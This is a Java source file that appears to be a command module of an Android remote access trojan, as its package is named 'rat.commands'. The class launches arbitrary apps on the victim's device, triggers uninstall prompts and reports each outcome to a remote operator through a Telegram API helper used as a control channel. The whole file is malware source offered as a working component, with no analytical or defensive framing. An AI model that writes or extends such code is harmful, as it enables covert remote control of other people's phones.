package com.enterprise.rat.commands;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import com.enterprise.rat.utils.TelegramApi;

public class AppControllerManager {
    private Context context;
    public AppControllerManager(Context context) { this.context = context; }

    public void launchApp(String pkg) {
        try {
            Intent intent = context.getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent != null) { intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); context.startActivity(intent); TelegramApi.sendMessage("✅ Launched " + pkg); }
            else TelegramApi.sendMessage("❌ Not found: " + pkg);
        } catch (Exception e) { TelegramApi.sendMessage("❌ " + e.getMessage()); }
    }

    public void uninstallApp(String pkg) {
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            TelegramApi.sendMessage("🗑 Uninstall prompt for " + pkg);
        } catch (Exception e) { TelegramApi.sendMessage("❌ " + e.getMessage()); }
    }
}
